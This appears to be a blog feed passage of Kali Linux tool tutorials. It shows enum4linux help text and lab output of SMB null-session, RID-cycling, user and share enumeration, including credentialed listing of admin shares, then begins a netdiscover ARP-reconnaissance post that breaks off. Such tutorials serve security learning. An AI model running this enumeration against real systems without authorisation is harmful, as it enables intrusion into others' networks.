</span><span class='line'>Usage: ./enum4linux.pl [options] ip
</span><span class='line'>
</span><span class='line'>Options are (like "enum"):
</span><span class='line'>    -U        get userlist
</span><span class='line'>    -M        get machine list*
</span><span class='line'>    -S        get sharelist
</span><span class='line'>    -P        get password policy information
</span><span class='line'>    -G        get group and member list
</span><span class='line'>    -d        be detailed, applies to -U and -S
</span><span class='line'>    -u user   specify username to use (default "")  
</span><span class='line'>    -p pass   specify password to use (default "")   
</span><span class='line'>
</span><span class='line'>The following options from enum.exe aren't implemented: -L, -N, -D, -f
</span><span class='line'>
</span><span class='line'>Additional options:
</span><span class='line'>    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
</span><span class='line'>              This opion is enabled if you don't provide any other options.
</span><span class='line'>    -h        Display this help message and exit
</span><span class='line'>    -r        enumerate users via RID cycling
</span><span class='line'>    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
</span><span class='line'>    -K n      Keep searching RIDs until n consective RIDs don't correspond to
</span><span class='line'>              a username.  Impies RID range ends at 999999. Useful 
</span><span class='line'>        against DCs.
</span><span class='line'>    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
</span><span class='line'>    -s file   brute force guessing for share names
</span><span class='line'>    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
</span><span class='line'>              Used to get sid with "lookupsid known_username"
</span><span class='line'>            Use commas to try several users: "-k admin,user1,user2"
</span><span class='line'>    -o        Get OS information
</span><span class='line'>    -i        Get printer information
</span><span class='line'>    -w wrkg   Specify workgroup manually (usually found automatically)
</span><span class='line'>    -n        Do an nmblookup (similar to nbtstat)
</span><span class='line'>    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
</span><span class='line'>
</span><span class='line'>RID cycling should extract a list of users from Windows (or Samba) hosts 
</span><span class='line'>which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network 
</span><span class='line'>access: Allow anonymous SID/Name translation" enabled (XP, 2003).
</span><span class='line'>
</span><span class='line'>NB: Samba servers often seem to have RIDs in the range 3000-3050.
</span><span class='line'>
</span><span class='line'>Dependancy info: You will need to have the samba package installed as this 
</span><span class='line'>script is basically just a wrapper around rpcclient, net, nmblookup and 
</span><span class='line'>smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ 
</span><span class='line'>is required to get Password Policy info.</span></code></pre></td></tr></table></div></figure>


<h2>enum4linux usage</h2>

<ul>
<li>get everything you can from a host without any credentials</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux 192.168.217.131
</span><span class='line'>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 19 10:06:33 2017
</span><span class='line'>
</span><span class='line'> ========================== 
</span><span class='line'>|    Target Information    |
</span><span class='line'> ========================== 
</span><span class='line'>Target ........... 192.168.217.131
</span><span class='line'>RID Range ........ 500-550,1000-1050
</span><span class='line'>Username ......... ''
</span><span class='line'>Password ......... ''
</span><span class='line'>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Enumerating Workgroup/Domain on 192.168.217.131    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[E] Can't find workgroup/domain
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> =============================================== 
</span><span class='line'>|    Nbtstat Information for 192.168.217.131    |
</span><span class='line'> =============================================== 
</span><span class='line'>Looking up status of 192.168.217.131
</span><span class='line'>No reply from 192.168.217.131
</span><span class='line'>
</span><span class='line'> ======================================== 
</span><span class='line'>|    Session Check on 192.168.217.131    |
</span><span class='line'> ======================================== 
</span><span class='line'>Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
</span><span class='line'>[+] Server 192.168.217.131 allows sessions using username '', password ''
</span><span class='line'>[+] Got domain/workgroup name: SAMBA
</span><span class='line'>
</span><span class='line'> ============================================== 
</span><span class='line'>|    Getting domain SID for 192.168.217.131    |
</span><span class='line'> ============================================== 
</span><span class='line'>Domain Name: SAMBA
</span><span class='line'>Domain Sid: (NULL SID)
</span><span class='line'>[+] Can't determine if host is part of domain or part of a workgroup
</span><span class='line'>
</span><span class='line'> ========================================= 
</span><span class='line'>|    OS information on 192.168.217.131    |
</span><span class='line'> ========================================= 
</span><span class='line'>[+] Got OS info for 192.168.217.131 from smbclient: Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>[+] Got OS info for 192.168.217.131 from srvinfo:
</span><span class='line'>  LOCALHOST      Wk Sv PrQ Unx NT SNT Samba File Server
</span><span class='line'>  platform_id     :   500
</span><span class='line'>  os version      :   6.1
</span><span class='line'>  server type     :   0x809a03
</span><span class='line'>
</span><span class='line'> ================================ 
</span><span class='line'>|    Users on 192.168.217.131    |
</span><span class='line'> ================================ 
</span><span class='line'>index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smbuser    Name: Samba access is allowed for this user Desc: 
</span><span class='line'>
</span><span class='line'>user:[smbuser] rid:[0x3e8]
</span><span class='line'>
</span><span class='line'> ============================================ 
</span><span class='line'>|    Share Enumeration on 192.168.217.131    |
</span><span class='line'> ============================================ 
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>Domain=[SAMBA] OS=[Windows 6.1] Server=[Samba 4.4.4]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  sharename       Disk      Only authorized users
</span><span class='line'>  IPC$            IPC       IPC Service (Samba File Server)
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  ---------            -------
</span><span class='line'>
</span><span class='line'>[+] Attempting to map shares on 192.168.217.131
</span><span class='line'>//192.168.217.131/sharename   Mapping: DENIED, Listing: N/A
</span><span class='line'>//192.168.217.131/IPC$    Mapping: OK Listing: DENIED
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Password Policy Information for 192.168.217.131    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[E] Unexpected error from polenum:
</span><span class='line'>Traceback (most recent call last):
</span><span class='line'>  File "/usr/bin/polenum", line 33, in &lt;module&gt;
</span><span class='line'>    from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr
</span><span class='line'>ImportError: cannot import name dcerpc_v4
</span><span class='line'>[+] Retieved partial password policy with rpcclient:
</span><span class='line'>
</span><span class='line'>Password Complexity: Disabled
</span><span class='line'>Minimum Password Length: 5
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ================================= 
</span><span class='line'>|    Groups on 192.168.217.131    |
</span><span class='line'> ================================= 
</span><span class='line'>
</span><span class='line'>[+] Getting builtin groups:
</span><span class='line'>
</span><span class='line'>[+] Getting builtin group memberships:
</span><span class='line'>
</span><span class='line'>[+] Getting local groups:
</span><span class='line'>
</span><span class='line'>[+] Getting local group memberships:
</span><span class='line'>
</span><span class='line'>[+] Getting domain groups:
</span><span class='line'>
</span><span class='line'>[+] Getting domain group memberships:
</span><span class='line'>
</span><span class='line'> ========================================================================== 
</span><span class='line'>|    Users on 192.168.217.131 via RID cycling (RIDS: 500-550,1000-1050)    |
</span><span class='line'> ========================================================================== 
</span><span class='line'>[I] Found new SID: S-1-22-1
</span><span class='line'>[I] Found new SID: S-1-5-21-3832469351-2479326917-463392201
</span><span class='line'>[I] Found new SID: S-1-5-32
</span><span class='line'>[+] Enumerating users using SID S-1-5-21-3832469351-2479326917-463392201 and logon username '', password ''
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-500 *unknown*\*unknown* (8)
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-501 LOCALHOST\nobody (Local User)
</span><span class='line'>[...]
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-513 LOCALHOST\None (Domain Group)
</span><span class='line'>S-1-5-21-3832469351-2479326917-463392201-1000 LOCALHOST\smbuser (Local User)
</span><span class='line'>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
</span><span class='line'>S-1-22-1-1000 Unix User\nixhat (Local User)
</span><span class='line'>S-1-22-1-1001 Unix User\smbuser (Local User)
</span><span class='line'>[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
</span><span class='line'>S-1-5-32-500 *unknown*\*unknown* (8)
</span><span class='line'>[...]
</span><span class='line'>S-1-5-32-544 BUILTIN\Administrators (Local Group)
</span><span class='line'>S-1-5-32-545 BUILTIN\Users (Local Group)
</span><span class='line'>S-1-5-32-546 BUILTIN\Guests (Local Group)
</span><span class='line'>S-1-5-32-547 BUILTIN\Power Users (Local Group)
</span><span class='line'>S-1-5-32-548 BUILTIN\Account Operators (Local Group)
</span><span class='line'>S-1-5-32-549 BUILTIN\Server Operators (Local Group)
</span><span class='line'>S-1-5-32-550 BUILTIN\Print Operators (Local Group)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ================================================ 
</span><span class='line'>|    Getting printer info for 192.168.217.131    |
</span><span class='line'> ================================================ 
</span><span class='line'>No printers returned.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>enum4linux complete on Mon Jun 19 10:07:15 2017</span></code></pre></td></tr></table></div></figure>


<p>I edited some not found output for sanity, but you can see that even without any previous information, we were able to gather quite a few pieces, like the workgroup name, the server version, and the existing shares and users</p>

<ul>
<li>perform some enumeration while also showing the commands being run</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -n -v 192.168.217.140
</span><span class='line'>[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
</span><span class='line'>[V] Dependent program "net" found in /usr/bin/net
</span><span class='line'>[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
</span><span class='line'>[V] Dependent program "smbclient" found in /usr/bin/smbclient
</span><span class='line'>[V] Dependent program "polenum" found in /usr/bin/polenum
</span><span class='line'>[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
</span><span class='line'>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 19 10:50:48 2017
</span><span class='line'>
</span><span class='line'> ========================== 
</span><span class='line'>|    Target Information    |
</span><span class='line'> ========================== 
</span><span class='line'>Target ........... 192.168.217.140
</span><span class='line'>RID Range ........ 500-550,1000-1050
</span><span class='line'>Username ......... ''
</span><span class='line'>Password ......... ''
</span><span class='line'>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Enumerating Workgroup/Domain on 192.168.217.140    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[V] Attempting to get domain name with command: nmblookup -A '192.168.217.140'
</span><span class='line'>[+] Got domain/workgroup name: WORKGROUP
</span><span class='line'>
</span><span class='line'> =============================================== 
</span><span class='line'>|    Nbtstat Information for 192.168.217.140    |
</span><span class='line'> =============================================== 
</span><span class='line'>Looking up status of 192.168.217.140
</span><span class='line'>  WIN-D7GA2J1M0TU &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
</span><span class='line'>  WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain/Workgroup Name
</span><span class='line'>  WIN-D7GA2J1M0TU &lt;20&gt; -         M &lt;ACTIVE&gt;  File Server Service
</span><span class='line'>  WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Browser Service Elections
</span><span class='line'>  WORKGROUP       &lt;1d&gt; -         M &lt;ACTIVE&gt;  Master Browser
</span><span class='line'>  ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Master Browser
</span><span class='line'>
</span><span class='line'>  MAC Address = 00-0C-29-5C-13-CA
</span><span class='line'>
</span><span class='line'> ======================================== 
</span><span class='line'>|    Session Check on 192.168.217.140    |
</span><span class='line'> ======================================== 
</span><span class='line'>[V] Attempting to make null session using command: smbclient -W 'WORKGROUP' //'192.168.217.140'/ipc$ -U''%'' -c 'help' 2&gt;&1
</span><span class='line'>[+] Server 192.168.217.140 allows sessions using username '', password ''
</span><span class='line'>
</span><span class='line'> ============================================== 
</span><span class='line'>|    Getting domain SID for 192.168.217.140    |
</span><span class='line'> ============================================== 
</span><span class='line'>[V] Attempting to get domain SID with command: rpcclient -W 'WORKGROUP' -U''%'' 192.168.217.140 -c 'lsaquery' 2&gt;&1
</span><span class='line'>could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
</span><span class='line'>could not obtain sid from server
</span><span class='line'>error: NT_STATUS_ACCESS_DENIED
</span><span class='line'>[+] Can't determine if host is part of domain or part of a workgroup
</span><span class='line'>enum4linux complete on Mon Jun 19 10:50:48 2017</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get OS information</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -o 192.168.217.140
</span><span class='line'>[...]
</span><span class='line'> ========================================= 
</span><span class='line'>|    OS information on 192.168.217.140    |
</span><span class='line'> ========================================= 
</span><span class='line'>[+] Got OS info for 192.168.217.140 from smbclient: Domain=[WIN-D7GA2J1M0TU] OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
</span><span class='line'>[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list shares on a server with credentials</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>enum4linux -u Administrator -p Password123! -S 192.168.217.141
</span><span class='line'>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 19 12:40:55 2017
</span><span class='line'>
</span><span class='line'> ========================== 
</span><span class='line'>|    Target Information    |
</span><span class='line'> ========================== 
</span><span class='line'>Target ........... 192.168.217.141
</span><span class='line'>RID Range ........ 500-550,1000-1050
</span><span class='line'>Username ......... 'Administrator'
</span><span class='line'>Password ......... 'Password123!'
</span><span class='line'>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> ======================================================= 
</span><span class='line'>|    Enumerating Workgroup/Domain on 192.168.217.141    |
</span><span class='line'> ======================================================= 
</span><span class='line'>[+] Got domain/workgroup name: SANGHELIOS0
</span><span class='line'>
</span><span class='line'> ======================================== 
</span><span class='line'>|    Session Check on 192.168.217.141    |
</span><span class='line'> ======================================== 
</span><span class='line'>[+] Server 192.168.217.141 allows sessions using username 'Administrator', password 'Password123!'
</span><span class='line'>
</span><span class='line'> ============================================== 
</span><span class='line'>|    Getting domain SID for 192.168.217.141    |
</span><span class='line'> ============================================== 
</span><span class='line'>Domain Name: SANGHELIOS0
</span><span class='line'>Domain Sid: S-1-5-21-1024350911-1337957381-1412282408
</span><span class='line'>[+] Host is part of a domain (not a workgroup)
</span><span class='line'>
</span><span class='line'> ============================================ 
</span><span class='line'>|    Share Enumeration on 192.168.217.141    |
</span><span class='line'> ============================================ 
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  ---------       ----      -------
</span><span class='line'>  ADMIN$          Disk      Remote Admin
</span><span class='line'>  C$              Disk      Default share
</span><span class='line'>  IPC$            IPC       Remote IPC
</span><span class='line'>  NETLOGON        Disk      Logon server share 
</span><span class='line'>  ops             Disk      
</span><span class='line'>  SYSVOL          Disk      Logon server share 
</span><span class='line'>  testshare       Disk      A share on Windows Server
</span><span class='line'>Connection to 192.168.217.141 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
</span><span class='line'>NetBIOS over TCP disabled -- no workgroup available
</span><span class='line'>
</span><span class='line'>[+] Attempting to map shares on 192.168.217.141
</span><span class='line'>//192.168.217.141/ADMIN$  Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/C$  [E] Can't understand response:
</span><span class='line'>WARNING: The "syslog" option is deprecated
</span><span class='line'>Domain=[SANGHELIOS0] OS=[Windows Server 2012 Datacenter 9200] Server=[Windows Server 2012 Datacenter 6.2]
</span><span class='line'>  $Recycle.Bin                      DHS        0  Thu Jul 26 03:38:59 2012
</span><span class='line'>  Boot                              DHS        0  Sun Oct 16 18:44:49 2016
</span><span class='line'>  bootmgr                          AHSR   398156  Wed Jul 25 23:44:30 2012
</span><span class='line'>  BOOTNXT                           AHS        1  Sat Jun  2 10:30:55 2012
</span><span class='line'>  BOOTSECT.BAK                     AHSR     8192  Sun Oct 16 18:44:50 2016
</span><span class='line'>  Documents and Settings            DHS        0  Thu Jul 26 03:14:09 2012
</span><span class='line'>  pagefile.sys                      AHS 402653184  Mon Jun 19 12:08:41 2017
</span><span class='line'>  PerfLogs                            D        0  Thu Jul 26 03:44:15 2012
</span><span class='line'>  Program Files                      DR        0  Sun Oct 16 07:53:13 2016
</span><span class='line'>  Program Files (x86)                 D        0  Thu Jul 26 04:04:58 2012
</span><span class='line'>  ProgramData                        DH        0  Sun Oct 23 08:55:39 2016
</span><span class='line'>  Recovery                          DHS        0  Sun Oct 16 07:48:22 2016
</span><span class='line'>  StorageReports                      D        0  Sat Oct 22 17:17:58 2016
</span><span class='line'>  System Volume Information         DHS        0  Sat Oct 22 17:17:27 2016
</span><span class='line'>  testshare                           D        0  Mon Jun 19 12:25:50 2017
</span><span class='line'>  Users                              DR        0  Sat Oct 22 16:06:28 2016
</span><span class='line'>  Windows                             D        0  Sat Oct 22 16:49:16 2016
</span><span class='line'>
</span><span class='line'>      7863807 blocks of size 4096. 5348507 blocks available
</span><span class='line'>//192.168.217.141/IPC$    Mapping: OK Listing: DENIED
</span><span class='line'>//192.168.217.141/NETLOGON    Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/ops Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/SYSVOL  Mapping: OK, Listing: OK
</span><span class='line'>//192.168.217.141/testshare   Mapping: OK, Listing: OK</span></code></pre></td></tr></table></div></figure>


<p>Once you&rsquo;re on the same network as your target, enum4linux is a great resource to help in gathering information about the target, that you can later use for an attack.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Your lucky number is 3552664958674928. \
</span><span class='line'>\ Watch for it everywhere.               /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Netdiscover - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools/"/>
    <updated>2017-06-16T13:05:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/16/netdiscover-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: a tool that can be used to perform ARP reconaissance and discover hosts on the local network. You could do that with Nmap too, but here netdiscover shines!</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/alexxy/netdiscover">https://github.com/alexxy/netdiscover</a></p>

<h2>Netdiscover description</h2>

<blockquote><p>netdiscover is an  active/passive  arp  reconnaissance  tool,  initialy
developed  to  gain  information  about  wireless networks without dhcp
servers in wardriving scenarios.  It  can  also  be  used  on  switched
networks.  Built  on top of libnet and libpcap, it can passively detect
online hosts or search for them by sending arp requests.</p>

<p>Furthermore, it can be used to inspect your network&rsquo;s arp  traffic,  or
find network addresses using auto scan mode, which will scan for common
local networks.</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html">http://manpages.ubuntu.com/manpages/precise/man8/netdiscover.8.html</a></p>

<h2>Netdiscover options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
</span><span class='line'>Written by: Jaime Penalba &lt;jpenalbae@gmail.com&gt;
</span><span class='line'>
</span><span class='line'>Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
</span><span class='line'>  -i device: your network device
</span><span class='line'>  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
</span><span class='line'>  -l file: scan the list of ranges contained into the given file
